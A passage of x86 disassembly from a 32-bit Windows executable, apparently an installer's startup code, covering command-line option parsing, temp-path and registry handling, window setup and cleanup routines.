  40335a:	8a 48 01             	mov    0x1(%eax),%cl
  40335d:	80 f9 20             	cmp    $0x20,%cl
  403360:	74 04                	je     0x403366
  403362:	3a cb                	cmp    %bl,%cl
  403364:	75 0a                	jne    0x403370
  403366:	c7 05 c0 37 42 00 01 	movl   $0x1,0x4237c0
  40336d:	00 00 00 
  403370:	0f be 0d e7 91 40 00 	movsbl 0x4091e7,%ecx
  403377:	0f be 15 e6 91 40 00 	movsbl 0x4091e6,%edx
  40337e:	c1 e1 08             	shl    $0x8,%ecx
  403381:	0b ca                	or     %edx,%ecx
  403383:	0f be 15 e5 91 40 00 	movsbl 0x4091e5,%edx
  40338a:	c1 e1 08             	shl    $0x8,%ecx
  40338d:	0b ca                	or     %edx,%ecx
  40338f:	0f be 15 e4 91 40 00 	movsbl 0x4091e4,%edx
  403396:	c1 e1 08             	shl    $0x8,%ecx
  403399:	0b ca                	or     %edx,%ecx
  40339b:	39 08                	cmp    %ecx,(%eax)
  40339d:	75 11                	jne    0x4033b0
  40339f:	8a 48 04             	mov    0x4(%eax),%cl
  4033a2:	80 f9 20             	cmp    $0x20,%cl
  4033a5:	74 04                	je     0x4033ab
  4033a7:	3a cb                	cmp    %bl,%cl
  4033a9:	75 05                	jne    0x4033b0
  4033ab:	83 4c 24 20 04       	orl    $0x4,0x20(%esp)
  4033b0:	0f be 0d df 91 40 00 	movsbl 0x4091df,%ecx
  4033b7:	0f be 15 de 91 40 00 	movsbl 0x4091de,%edx
  4033be:	c1 e1 08             	shl    $0x8,%ecx
  4033c1:	0b ca                	or     %edx,%ecx
  4033c3:	0f be 15 dd 91 40 00 	movsbl 0x4091dd,%edx
  4033ca:	c1 e1 08             	shl    $0x8,%ecx
  4033cd:	0b ca                	or     %edx,%ecx
  4033cf:	0f be 15 dc 91 40 00 	movsbl 0x4091dc,%edx
  4033d6:	c1 e1 08             	shl    $0x8,%ecx
  4033d9:	0b ca                	or     %edx,%ecx
  4033db:	39 48 fe             	cmp    %ecx,-0x2(%eax)
  4033de:	74 1c                	je     0x4033fc
  4033e0:	ff 74 24 14          	push   0x14(%esp)
  4033e4:	50                   	push   %eax
  4033e5:	e8 20 25 00 00       	call   0x40590a
  4033ea:	80 38 22             	cmpb   $0x22,(%eax)
  4033ed:	75 01                	jne    0x4033f0
  4033ef:	40                   	inc    %eax
  4033f0:	8a 08                	mov    (%eax),%cl
  4033f2:	3a cb                	cmp    %bl,%cl
  4033f4:	0f 85 36 ff ff ff    	jne    0x403330
  4033fa:	eb 11                	jmp    0x40340d
  4033fc:	88 58 fe             	mov    %bl,-0x2(%eax)
  4033ff:	83 c0 02             	add    $0x2,%eax
  403402:	50                   	push   %eax
  403403:	68 00 94 42 00       	push   $0x429400
  403408:	e8 60 2a 00 00       	call   0x405e6d
  40340d:	8b 3d a0 70 40 00    	mov    0x4070a0,%edi
  403413:	be 00 a4 42 00       	mov    $0x42a400,%esi
  403418:	56                   	push   %esi
  403419:	68 00 04 00 00       	push   $0x400
  40341e:	ff d7                	call   *%edi
  403420:	e8 df fd ff ff       	call   0x403204
  403425:	85 c0                	test   %eax,%eax
  403427:	75 56                	jne    0x40347f
  403429:	68 fb 03 00 00       	push   $0x3fb
  40342e:	56                   	push   %esi
  40342f:	ff 15 9c 70 40 00    	call   *0x40709c
  403435:	68 d4 91 40 00       	push   $0x4091d4
  40343a:	56                   	push   %esi
  40343b:	e8 49 2a 00 00       	call   0x405e89
  403440:	e8 bf fd ff ff       	call   0x403204
  403445:	85 c0                	test   %eax,%eax
  403447:	75 36                	jne    0x40347f
  403449:	56                   	push   %esi
  40344a:	68 fc 03 00 00       	push   $0x3fc
  40344f:	ff d7                	call   *%edi
  403451:	68 d0 91 40 00       	push   $0x4091d0
  403456:	56                   	push   %esi
  403457:	e8 2d 2a 00 00       	call   0x405e89
  40345c:	8b 3d 98 70 40 00    	mov    0x407098,%edi
  403462:	56                   	push   %esi
  403463:	68 c8 91 40 00       	push   $0x4091c8
  403468:	ff d7                	call   *%edi
  40346a:	56                   	push   %esi
  40346b:	68 c4 91 40 00       	push   $0x4091c4
  403470:	ff d7                	call   *%edi
  403472:	e8 8d fd ff ff       	call   0x403204
  403477:	85 c0                	test   %eax,%eax
  403479:	0f 84 ae 00 00 00    	je     0x40352d
  40347f:	68 00 a0 42 00       	push   $0x42a000
  403484:	ff 15 30 71 40 00    	call   *0x407130
  40348a:	ff 74 24 20          	push   0x20(%esp)
  40348e:	e8 2d f8 ff ff       	call   0x402cc0
  403493:	3b c3                	cmp    %ebx,%eax
  403495:	89 44 24 10          	mov    %eax,0x10(%esp)
  403499:	0f 85 8e 00 00 00    	jne    0x40352d
  40349f:	39 1d 3c 37 42 00    	cmp    %ebx,0x42373c
  4034a5:	74 76                	je     0x40351d
  4034a7:	53                   	push   %ebx
  4034a8:	55                   	push   %ebp
  4034a9:	e8 5c 24 00 00       	call   0x40590a
  4034ae:	8b f8                	mov    %eax,%edi
  4034b0:	3b fd                	cmp    %ebp,%edi
  4034b2:	72 34                	jb     0x4034e8
  4034b4:	0f be 05 bf 91 40 00 	movsbl 0x4091bf,%eax
  4034bb:	0f be 0d be 91 40 00 	movsbl 0x4091be,%ecx
  4034c2:	c1 e0 08             	shl    $0x8,%eax
  4034c5:	0b c1                	or     %ecx,%eax
  4034c7:	0f be 0d bd 91 40 00 	movsbl 0x4091bd,%ecx
  4034ce:	c1 e0 08             	shl    $0x8,%eax
  4034d1:	0b c1                	or     %ecx,%eax
  4034d3:	0f be 0d bc 91 40 00 	movsbl 0x4091bc,%ecx
  4034da:	c1 e0 08             	shl    $0x8,%eax
  4034dd:	0b c1                	or     %ecx,%eax
  4034df:	39 07                	cmp    %eax,(%edi)
  4034e1:	74 05                	je     0x4034e8
  4034e3:	4f                   	dec    %edi
  4034e4:	3b fd                	cmp    %ebp,%edi
  4034e6:	73 f7                	jae    0x4034df
  4034e8:	3b fd                	cmp    %ebp,%edi
  4034ea:	c7 44 24 10 74 91 40 	movl   $0x409174,0x10(%esp)
  4034f1:	00 
  4034f2:	72 65                	jb     0x403559
  4034f4:	88 1f                	mov    %bl,(%edi)
  4034f6:	83 c7 04             	add    $0x4,%edi
  4034f9:	57                   	push   %edi
  4034fa:	e8 ce 24 00 00       	call   0x4059cd
  4034ff:	85 c0                	test   %eax,%eax
  403501:	74 2a                	je     0x40352d
  403503:	57                   	push   %edi
  403504:	68 00 94 42 00       	push   $0x429400
  403509:	e8 5f 29 00 00       	call   0x405e6d
  40350e:	57                   	push   %edi
  40350f:	68 00 98 42 00       	push   $0x429800
  403514:	e8 54 29 00 00       	call   0x405e6d
  403519:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  40351d:	83 0d cc 37 42 00 ff 	orl    $0xffffffff,0x4237cc
  403524:	e8 c4 02 00 00       	call   0x4037ed
  403529:	89 44 24 18          	mov    %eax,0x18(%esp)
  40352d:	e8 c9 01 00 00       	call   0x4036fb
  403532:	ff 15 84 72 40 00    	call   *0x407284
  403538:	39 5c 24 10          	cmp    %ebx,0x10(%esp)
  40353c:	5d                   	pop    %ebp
  40353d:	0f 84 1e 01 00 00    	je     0x403661
  403543:	68 10 00 20 00       	push   $0x200010
  403548:	ff 74 24 10          	push   0x10(%esp)
  40354c:	e8 12 21 00 00       	call   0x405663
  403551:	6a 02                	push   $0x2
  403553:	ff 15 94 70 40 00    	call   *0x407094
  403559:	e8 88 20 00 00       	call   0x4055e6
  40355e:	68 b4 91 40 00       	push   $0x4091b4
  403563:	56                   	push   %esi
  403564:	8b f8                	mov    %eax,%edi
  403566:	e8 1e 29 00 00       	call   0x405e89
  40356b:	3b fb                	cmp    %ebx,%edi
  40356d:	74 0b                	je     0x40357a
  40356f:	68 b0 91 40 00       	push   $0x4091b0
  403574:	56                   	push   %esi
  403575:	e8 0f 29 00 00       	call   0x405e89
  40357a:	68 a8 91 40 00       	push   $0x4091a8
  40357f:	56                   	push   %esi
  403580:	e8 04 29 00 00       	call   0x405e89
  403585:	bd 00 9c 42 00       	mov    $0x429c00,%ebp
  40358a:	55                   	push   %ebp
  40358b:	56                   	push   %esi
  40358c:	ff 15 0c 71 40 00    	call   *0x40710c
  403592:	85 c0                	test   %eax,%eax
  403594:	74 97                	je     0x40352d
  403596:	3b fb                	cmp    %ebx,%edi
  403598:	56                   	push   %esi
  403599:	74 07                	je     0x4035a2
  40359b:	e8 ac 1f 00 00       	call   0x40554c
  4035a0:	eb 05                	jmp    0x4035a7
  4035a2:	e8 22 20 00 00       	call   0x4055c9
  4035a7:	56                   	push   %esi
  4035a8:	ff 15 f8 70 40 00    	call   *0x4070f8
  4035ae:	38 1d 00 94 42 00    	cmp    %bl,0x429400
  4035b4:	75 0b                	jne    0x4035c1
  4035b6:	55                   	push   %ebp
  4035b7:	68 00 94 42 00       	push   $0x429400
  4035bc:	e8 ac 28 00 00       	call   0x405e6d
  4035c1:	ff 74 24 1c          	push   0x1c(%esp)
  4035c5:	68 00 40 42 00       	push   $0x424000
  4035ca:	e8 9e 28 00 00       	call   0x405e6d
  4035cf:	66 0f be 0d a4 91 40 	movsbw 0x4091a4,%cx
  4035d6:	00 
  4035d7:	33 c0                	xor    %eax,%eax
  4035d9:	6a 1a                	push   $0x1a
  4035db:	8a 25 a5 91 40 00    	mov    0x4091a5,%ah
  4035e1:	5d                   	pop    %ebp
  4035e2:	0b c1                	or     %ecx,%eax
  4035e4:	bf f0 e8 41 00       	mov    $0x41e8f0,%edi
  4035e9:	66 a3 00 44 42 00    	mov    %ax,0x424400
  4035ef:	a1 30 37 42 00       	mov    0x423730,%eax
  4035f4:	ff b0 20 01 00 00    	push   0x120(%eax)
  4035fa:	57                   	push   %edi
  4035fb:	e8 8f 28 00 00       	call   0x405e8f
  403600:	57                   	push   %edi
  403601:	ff 15 30 71 40 00    	call   *0x407130
  403607:	39 5c 24 10          	cmp    %ebx,0x10(%esp)
  40360b:	74 3f                	je     0x40364c
  40360d:	6a 01                	push   $0x1
  40360f:	57                   	push   %edi
  403610:	68 00 ac 42 00       	push   $0x42ac00
  403615:	ff 15 70 70 40 00    	call   *0x407070
  40361b:	85 c0                	test   %eax,%eax
  40361d:	74 2d                	je     0x40364c
  40361f:	53                   	push   %ebx
  403620:	57                   	push   %edi
  403621:	e8 02 27 00 00       	call   0x405d28
  403626:	a1 30 37 42 00       	mov    0x423730,%eax
  40362b:	ff b0 24 01 00 00    	push   0x124(%eax)
  403631:	57                   	push   %edi
  403632:	e8 58 28 00 00       	call   0x405e8f
  403637:	57                   	push   %edi
  403638:	e8 c1 1f 00 00       	call   0x4055fe
  40363d:	3b c3                	cmp    %ebx,%eax
  40363f:	74 0b                	je     0x40364c
  403641:	50                   	push   %eax
  403642:	ff 15 f4 70 40 00    	call   *0x4070f4
  403648:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  40364c:	fe 05 00 44 42 00    	incb   0x424400
  403652:	4d                   	dec    %ebp
  403653:	75 9a                	jne    0x4035ef
  403655:	53                   	push   %ebx
  403656:	56                   	push   %esi
  403657:	e8 cc 26 00 00       	call   0x405d28
  40365c:	e9 cc fe ff ff       	jmp    0x40352d
  403661:	39 1d b4 37 42 00    	cmp    %ebx,0x4237b4
  403667:	74 7a                	je     0x4036e3
  403669:	8d 44 24 18          	lea    0x18(%esp),%eax
  40366d:	50                   	push   %eax
  40366e:	6a 28                	push   $0x28
  403670:	ff 15 b0 70 40 00    	call   *0x4070b0
  403676:	50                   	push   %eax
  403677:	ff 15 08 70 40 00    	call   *0x407008
  40367d:	6a 02                	push   $0x2
  40367f:	85 c0                	test   %eax,%eax
  403681:	5f                   	pop    %edi
  403682:	74 30                	je     0x4036b4
  403684:	8d 44 24 24          	lea    0x24(%esp),%eax
  403688:	50                   	push   %eax
  403689:	68 90 91 40 00       	push   $0x409190
  40368e:	53                   	push   %ebx
  40368f:	ff 15 0c 70 40 00    	call   *0x40700c
  403695:	53                   	push   %ebx
  403696:	53                   	push   %ebx
  403697:	8d 44 24 28          	lea    0x28(%esp),%eax
  40369b:	53                   	push   %ebx
  40369c:	50                   	push   %eax
  40369d:	53                   	push   %ebx
  40369e:	ff 74 24 2c          	push   0x2c(%esp)
  4036a2:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%esp)
  4036a9:	00 
  4036aa:	89 7c 24 44          	mov    %edi,0x44(%esp)
  4036ae:	ff 15 10 70 40 00    	call   *0x407010
  4036b4:	6a 04                	push   $0x4
  4036b6:	e8 4b 2b 00 00       	call   0x406206
  4036bb:	3b c3                	cmp    %ebx,%eax
  4036bd:	be 02 00 04 80       	mov    $0x80040002,%esi
  4036c2:	74 0c                	je     0x4036d0
  4036c4:	56                   	push   %esi
  4036c5:	6a 25                	push   $0x25
  4036c7:	53                   	push   %ebx
  4036c8:	53                   	push   %ebx
  4036c9:	53                   	push   %ebx
  4036ca:	ff d0                	call   *%eax
  4036cc:	85 c0                	test   %eax,%eax
  4036ce:	74 0c                	je     0x4036dc
  4036d0:	56                   	push   %esi
  4036d1:	57                   	push   %edi
  4036d2:	ff 15 34 72 40 00    	call   *0x407234
  4036d8:	85 c0                	test   %eax,%eax
  4036da:	75 07                	jne    0x4036e3
  4036dc:	6a 09                	push   $0x9
  4036de:	e8 32 dd ff ff       	call   0x401415
  4036e3:	a1 cc 37 42 00       	mov    0x4237cc,%eax
  4036e8:	83 f8 ff             	cmp    $0xffffffff,%eax
  4036eb:	74 04                	je     0x4036f1
  4036ed:	89 44 24 14          	mov    %eax,0x14(%esp)
  4036f1:	ff 74 24 14          	push   0x14(%esp)
  4036f5:	ff 15 94 70 40 00    	call   *0x407094
  4036fb:	a1 18 90 40 00       	mov    0x409018,%eax
  403700:	56                   	push   %esi
  403701:	8b 35 f4 70 40 00    	mov    0x4070f4,%esi
  403707:	83 f8 ff             	cmp    $0xffffffff,%eax
  40370a:	74 0a                	je     0x403716
  40370c:	50                   	push   %eax
  40370d:	ff d6                	call   *%esi
  40370f:	83 0d 18 90 40 00 ff 	orl    $0xffffffff,0x409018
  403716:	a1 1c 90 40 00       	mov    0x40901c,%eax
  40371b:	83 f8 ff             	cmp    $0xffffffff,%eax
  40371e:	74 0a                	je     0x40372a
  403720:	50                   	push   %eax
  403721:	ff d6                	call   *%esi
  403723:	83 0d 1c 90 40 00 ff 	orl    $0xffffffff,0x40901c
  40372a:	e8 29 00 00 00       	call   0x403758
  40372f:	6a 07                	push   $0x7
  403731:	68 00 a8 42 00       	push   $0x42a800
  403736:	e8 d4 1f 00 00       	call   0x40570f
  40373b:	5e                   	pop    %esi
  40373c:	c3                   	ret
  40373d:	56                   	push   %esi
  40373e:	8b 35 f4 ec 41 00    	mov    0x41ecf4,%esi
  403744:	eb 0a                	jmp    0x403750
  403746:	ff 74 24 08          	push   0x8(%esp)
  40374a:	ff 56 04             	call   *0x4(%esi)
  40374d:	8b 36                	mov    (%esi),%esi
  40374f:	59                   	pop    %ecx
  403750:	85 f6                	test   %esi,%esi
  403752:	75 f2                	jne    0x403746
  403754:	5e                   	pop    %esi
  403755:	c2 04 00             	ret    $0x4
  403758:	56                   	push   %esi
  403759:	8b 35 f4 ec 41 00    	mov    0x41ecf4,%esi
  40375f:	6a 00                	push   $0x0
  403761:	e8 d7 ff ff ff       	call   0x40373d
  403766:	85 f6                	test   %esi,%esi
  403768:	74 1a                	je     0x403784
  40376a:	57                   	push   %edi
  40376b:	8b fe                	mov    %esi,%edi
  40376d:	8b 36                	mov    (%esi),%esi
  40376f:	ff 77 08             	push   0x8(%edi)
  403772:	ff 15 44 71 40 00    	call   *0x407144
  403778:	57                   	push   %edi
  403779:	ff 15 24 71 40 00    	call   *0x407124
  40377f:	85 f6                	test   %esi,%esi
  403781:	75 e8                	jne    0x40376b
  403783:	5f                   	pop    %edi
  403784:	83 25 f4 ec 41 00 00 	andl   $0x0,0x41ecf4
  40378b:	5e                   	pop    %esi
  40378c:	c3                   	ret
  40378d:	a1 f4 ec 41 00       	mov    0x41ecf4,%eax
  403792:	eb 0b                	jmp    0x40379f
  403794:	8b 48 08             	mov    0x8(%eax),%ecx
  403797:	3b 4c 24 04          	cmp    0x4(%esp),%ecx
  40379b:	74 0a                	je     0x4037a7
  40379d:	8b 00                	mov    (%eax),%eax
  40379f:	85 c0                	test   %eax,%eax
  4037a1:	75 f1                	jne    0x403794
  4037a3:	40                   	inc    %eax
  4037a4:	c2 04 00             	ret    $0x4
  4037a7:	33 c0                	xor    %eax,%eax
  4037a9:	eb f9                	jmp    0x4037a4
  4037ab:	56                   	push   %esi
  4037ac:	8b 74 24 08          	mov    0x8(%esp),%esi
  4037b0:	56                   	push   %esi
  4037b1:	e8 d7 ff ff ff       	call   0x40378d
  4037b6:	85 c0                	test   %eax,%eax
  4037b8:	75 03                	jne    0x4037bd
  4037ba:	40                   	inc    %eax
  4037bb:	eb 2c                	jmp    0x4037e9
  4037bd:	6a 0c                	push   $0xc
  4037bf:	6a 40                	push   $0x40
  4037c1:	ff 15 60 71 40 00    	call   *0x407160
  4037c7:	85 c0                	test   %eax,%eax
  4037c9:	74 1b                	je     0x4037e6
  4037cb:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  4037cf:	89 70 08             	mov    %esi,0x8(%eax)
  4037d2:	89 48 04             	mov    %ecx,0x4(%eax)
  4037d5:	8b 0d f4 ec 41 00    	mov    0x41ecf4,%ecx
  4037db:	89 08                	mov    %ecx,(%eax)
  4037dd:	a3 f4 ec 41 00       	mov    %eax,0x41ecf4
  4037e2:	33 c0                	xor    %eax,%eax
  4037e4:	eb 03                	jmp    0x4037e9
  4037e6:	83 c8 ff             	or     $0xffffffff,%eax
  4037e9:	5e                   	pop    %esi
  4037ea:	c2 08 00             	ret    $0x8
  4037ed:	83 ec 10             	sub    $0x10,%esp
  4037f0:	53                   	push   %ebx
  4037f1:	55                   	push   %ebp
  4037f2:	56                   	push   %esi
  4037f3:	8b 35 30 37 42 00    	mov    0x423730,%esi
  4037f9:	57                   	push   %edi
  4037fa:	6a 02                	push   $0x2
  4037fc:	e8 05 2a 00 00       	call   0x406206
  403801:	33 db                	xor    %ebx,%ebx
  403803:	3b c3                	cmp    %ebx,%eax
  403805:	74 12                	je     0x403819
  403807:	ff d0                	call   *%eax
  403809:	0f b7 c0             	movzwl %ax,%eax
  40380c:	50                   	push   %eax
  40380d:	68 00 a0 42 00       	push   $0x42a000
  403812:	e8 b4 25 00 00       	call   0x405dcb
  403817:	eb 54                	jmp    0x40386d
  403819:	bf 30 fd 41 00       	mov    $0x41fd30,%edi
  40381e:	53                   	push   %ebx
  40381f:	57                   	push   %edi
  403820:	53                   	push   %ebx
  403821:	68 3c 73 40 00       	push   $0x40733c
  403826:	68 01 00 00 80       	push   $0x80000001
  40382b:	c6 05 00 a0 42 00 30 	movb   $0x30,0x42a000
  403832:	c6 05 01 a0 42 00 78 	movb   $0x78,0x42a001
  403839:	88 1d 02 a0 42 00    	mov    %bl,0x42a002
  40383f:	e8 10 25 00 00       	call   0x405d54
  403844:	38 1d 30 fd 41 00    	cmp    %bl,0x41fd30
  40384a:	75 16                	jne    0x403862
  40384c:	53                   	push   %ebx
  40384d:	57                   	push   %edi
  40384e:	68 5a 73 40 00       	push   $0x40735a
  403853:	68 14 73 40 00       	push   $0x407314
  403858:	68 03 00 00 80       	push   $0x80000003
  40385d:	e8 f2 24 00 00       	call   0x405d54
  403862:	57                   	push   %edi
  403863:	68 00 a0 42 00       	push   $0x42a000
  403868:	e8 1c 26 00 00       	call   0x405e89
  40386d:	e8 40 02 00 00       	call   0x403ab2
  403872:	a1 38 37 42 00       	mov    0x423738,%eax
  403877:	bd 00 94 42 00       	mov    $0x429400,%ebp
  40387c:	83 e0 20             	and    $0x20,%eax
  40387f:	55                   	push   %ebp
  403880:	a3 a0 37 42 00       	mov    %eax,0x4237a0
  403885:	c7 05 bc 37 42 00 00 	movl   $0x10000,0x4237bc
  40388c:	00 01 00 
  40388f:	e8 39 21 00 00       	call   0x4059cd
  403894:	85 c0                	test   %eax,%eax
  403896:	0f 85 81 00 00 00    	jne    0x40391d
  40389c:	8b 4e 48             	mov    0x48(%esi),%ecx
  40389f:	3b cb                	cmp    %ebx,%ecx
  4038a1:	74 7a                	je     0x40391d
  4038a3:	8b 56 4c             	mov    0x4c(%esi),%edx
  4038a6:	a1 58 37 42 00       	mov    0x423758,%eax
  4038ab:	bf c0 26 42 00       	mov    $0x4226c0,%edi
  4038b0:	53                   	push   %ebx
  4038b1:	03 d0                	add    %eax,%edx
  4038b3:	57                   	push   %edi
  4038b4:	03 c8                	add    %eax,%ecx
  4038b6:	52                   	push   %edx
  4038b7:	51                   	push   %ecx
  4038b8:	ff 76 44             	push   0x44(%esi)
  4038bb:	e8 94 24 00 00       	call   0x405d54
  4038c0:	a0 c0 26 42 00       	mov    0x4226c0,%al
  4038c5:	3a c3                	cmp    %bl,%al
  4038c7:	74 54                	je     0x40391d
  4038c9:	3c 22                	cmp    $0x22,%al
  4038cb:	75 0f                	jne    0x4038dc
  4038cd:	bf c1 26 42 00       	mov    $0x4226c1,%edi
  4038d2:	6a 22                	push   $0x22
  4038d4:	57                   	push   %edi
  4038d5:	e8 30 20 00 00       	call   0x40590a
  4038da:	88 18                	mov    %bl,(%eax)
  4038dc:	57                   	push   %edi
  4038dd:	e8 a1 25 00 00       	call   0x405e83
  4038e2:	8d 44 38 fc          	lea    -0x4(%eax,%edi,1),%eax
  4038e6:	3b c7                	cmp    %edi,%eax
  4038e8:	76 26                	jbe    0x403910
  4038ea:	68 14 92 40 00       	push   $0x409214
  4038ef:	50                   	push   %eax
  4038f0:	ff 15 0c 71 40 00    	call   *0x40710c
  4038f6:	85 c0                	test   %eax,%eax
  4038f8:	75 16                	jne    0x403910
  4038fa:	57                   	push   %edi
  4038fb:	ff 15 8c 70 40 00    	call   *0x40708c
  403901:	83 f8 ff             	cmp    $0xffffffff,%eax
  403904:	74 04                	je     0x40390a
  403906:	a8 10                	test   $0x10,%al
  403908:	75 06                	jne    0x403910
  40390a:	57                   	push   %edi
  40390b:	e8 16 20 00 00       	call   0x405926
  403910:	57                   	push   %edi
  403911:	e8 c9 1f 00 00       	call   0x4058df
  403916:	50                   	push   %eax
  403917:	55                   	push   %ebp
  403918:	e8 50 25 00 00       	call   0x405e6d
  40391d:	55                   	push   %ebp
  40391e:	e8 aa 20 00 00       	call   0x4059cd
  403923:	85 c0                	test   %eax,%eax
  403925:	75 0c                	jne    0x403933
  403927:	ff b6 18 01 00 00    	push   0x118(%esi)
  40392d:	55                   	push   %ebp
  40392e:	e8 5c 25 00 00       	call   0x405e8f
  403933:	68 40 80 00 00       	push   $0x8040
  403938:	53                   	push   %ebx
  403939:	53                   	push   %ebx
  40393a:	6a 01                	push   $0x1
  40393c:	6a 67                	push   $0x67
  40393e:	ff 35 20 37 42 00    	push   0x423720
  403944:	ff 15 50 72 40 00    	call   *0x407250
  40394a:	a3 08 2f 42 00       	mov    %eax,0x422f08
  40394f:	83 7e 50 ff          	cmpl   $0xffffffff,0x50(%esi)
  403953:	bf c0 2e 42 00       	mov    $0x422ec0,%edi
  403958:	74 7f                	je     0x4039d9
  40395a:	8b 0d 20 37 42 00    	mov    0x423720,%ecx
  403960:	be 10 92 40 00       	mov    $0x409210,%esi
  403965:	57                   	push   %edi
  403966:	c7 05 c4 2e 42 00 00 	movl   $0x401000,0x422ec4
  40396d:	10 40 00 
  403970:	89 0d d0 2e 42 00    	mov    %ecx,0x422ed0
  403976:	a3 d4 2e 42 00       	mov    %eax,0x422ed4
  40397b:	89 35 e4 2e 42 00    	mov    %esi,0x422ee4
  403981:	ff 15 1c 72 40 00    	call   *0x40721c
  403987:	66 85 c0             	test   %ax,%ax
  40398a:	0f 84 18 01 00 00    	je     0x403aa8
  403990:	8d 44 24 10          	lea    0x10(%esp),%eax
  403994:	53                   	push   %ebx
  403995:	50                   	push   %eax
  403996:	53                   	push   %ebx
  403997:	6a 30                	push   $0x30
  403999:	ff 15 20 72 40 00    	call   *0x407220
  40399f:	53                   	push   %ebx
  4039a0:	ff 35 20 37 42 00    	push   0x423720
  4039a6:	8b 44 24 24          	mov    0x24(%esp),%eax
  4039aa:	2b 44 24 1c          	sub    0x1c(%esp),%eax
  4039ae:	53                   	push   %ebx
  4039af:	53                   	push   %ebx
  4039b0:	50                   	push   %eax
  4039b1:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4039b5:	2b 44 24 24          	sub    0x24(%esp),%eax
  4039b9:	50                   	push   %eax
  4039ba:	ff 74 24 2c          	push   0x2c(%esp)
  4039be:	ff 74 24 2c          	push   0x2c(%esp)
  4039c2:	68 00 00 00 80       	push   $0x80000000
  4039c7:	53                   	push   %ebx
  4039c8:	56                   	push   %esi
  4039c9:	68 80 00 00 00       	push   $0x80
  4039ce:	ff 15 24 72 40 00    	call   *0x407224
  4039d4:	a3 10 fd 41 00       	mov    %eax,0x41fd10
  4039d9:	53                   	push   %ebx
  4039da:	e8 36 da ff ff       	call   0x401415
  4039df:	85 c0                	test   %eax,%eax
  4039e1:	74 08                	je     0x4039eb
  4039e3:	6a 02                	push   $0x2
  4039e5:	58                   	pop    %eax
  4039e6:	e9 bf 00 00 00       	jmp    0x403aaa
  4039eb:	e8 c2 00 00 00       	call   0x403ab2
  4039f0:	39 1d c0 37 42 00    	cmp    %ebx,0x4237c0
  4039f6:	0f 85 83 00 00 00    	jne    0x403a7f
  4039fc:	6a 05                	push   $0x5
  4039fe:	ff 35 10 fd 41 00    	push   0x41fd10
  403a04:	ff 15 78 72 40 00    	call   *0x407278
  403a0a:	68 08 73 40 00       	push   $0x407308
  403a0f:	e8 84 27 00 00       	call   0x406198
  403a14:	85 c0                	test   %eax,%eax
  403a16:	75 0a                	jne    0x403a22
  403a18:	68 fc 72 40 00       	push   $0x4072fc
  403a1d:	e8 76 27 00 00       	call   0x406198
  403a22:	8b 35 28 72 40 00    	mov    0x407228,%esi
  403a28:	bd f0 72 40 00       	mov    $0x4072f0,%ebp
  403a2d:	57                   	push   %edi
  403a2e:	55                   	push   %ebp
  403a2f:	53                   	push   %ebx
  403a30:	ff d6                	call   *%esi
  403a32:	85 c0                	test   %eax,%eax
  403a34:	75 16                	jne    0x403a4c
  403a36:	57                   	push   %edi
  403a37:	68 e4 72 40 00       	push   $0x4072e4
  403a3c:	53                   	push   %ebx
  403a3d:	ff d6                	call   *%esi
  403a3f:	57                   	push   %edi
  403a40:	89 2d e4 2e 42 00    	mov    %ebp,0x422ee4
  403a46:	ff 15 1c 72 40 00    	call   *0x40721c
  403a4c:	a1 00 2f 42 00       	mov    0x422f00,%eax
  403a51:	53                   	push   %ebx
  403a52:	83 c0 69             	add    $0x69,%eax
  403a55:	68 75 3b 40 00       	push   $0x403b75
  403a5a:	0f b7 c0             	movzwl %ax,%eax
  403a5d:	53                   	push   %ebx
  403a5e:	50                   	push   %eax
  403a5f:	ff 35 20 37 42 00    	push   0x423720
  403a65:	ff 15 2c 72 40 00    	call   *0x40722c
  403a6b:	6a 05                	push   $0x5
  403a6d:	8b f0                	mov    %eax,%esi
  403a6f:	e8 a1 d9 ff ff       	call   0x401415
  403a74:	6a 01                	push   $0x1
  403a76:	e8 c2 fc ff ff       	call   0x40373d
  403a7b:	8b c6                	mov    %esi,%eax
  403a7d:	eb 2b                	jmp    0x403aaa
  403a7f:	53                   	push   %ebx
  403a80:	e8 d3 16 00 00       	call   0x405158
  403a85:	85 c0                	test   %eax,%eax
  403a87:	74 18                	je     0x403aa1
  403a89:	39 1d ec 2e 42 00    	cmp    %ebx,0x422eec
  403a8f:	0f 85 4e ff ff ff    	jne    0x4039e3
  403a95:	6a 02                	push   $0x2
  403a97:	e8 79 d9 ff ff       	call   0x401415
  403a9c:	e9 42 ff ff ff       	jmp    0x4039e3
  403aa1:	6a 01                	push   $0x1
  403aa3:	e8 6d d9 ff ff       	call   0x401415
  403aa8:	33 c0                	xor    %eax,%eax
  403aaa:	5f                   	pop    %edi
  403aab:	5e                   	pop    %esi
  403aac:	5d                   	pop    %ebp
  403aad:	5b                   	pop    %ebx
  403aae:	83 c4 10             	add    $0x10,%esp
  403ab1:	c3                   	ret
  403ab2:	53                   	push   %ebx
  403ab3:	55                   	push   %ebp
  403ab4:	56                   	push   %esi
  403ab5:	57                   	push   %edi
  403ab6:	bf 00 a0 42 00       	mov    $0x42a000,%edi
  403abb:	bb ff ff 00 00       	mov    $0xffff,%ebx
  403ac0:	57                   	push   %edi
  403ac1:	e8 1e 23 00 00       	call   0x405de4
  403ac6:	8b 35 64 37 42 00    	mov    0x423764,%esi
  403acc:	85 f6                	test   %esi,%esi
  403ace:	74 45                	je     0x403b15
  403ad0:	8b 0d 30 37 42 00    	mov    0x423730,%ecx
  403ad6:	8b 49 64             	mov    0x64(%ecx),%ecx
  403ad9:	8b d1                	mov    %ecx,%edx
  403adb:	0f af ce             	imul   %esi,%ecx
  403ade:	f7 da                	neg    %edx
  403ae0:	03 0d 60 37 42 00    	add    0x423760,%ecx
  403ae6:	03 ca                	add    %edx,%ecx
  403ae8:	4e                   	dec    %esi
  403ae9:	66 8b 29             	mov    (%ecx),%bp
  403aec:	66 33 e8             	xor    %ax,%bp
  403aef:	23 eb                	and    %ebx,%ebp
  403af1:	66 85 ed             	test   %bp,%bp
  403af4:	74 06                	je     0x403afc
  403af6:	85 f6                	test   %esi,%esi
  403af8:	75 ec                	jne    0x403ae6
  403afa:	eb 19                	jmp    0x403b15
  403afc:	8b 51 02             	mov    0x2(%ecx),%edx
  403aff:	89 15 00 2f 42 00    	mov    %edx,0x422f00
  403b05:	8b 51 06             	mov    0x6(%ecx),%edx
  403b08:	89 15 c8 37 42 00    	mov    %edx,0x4237c8
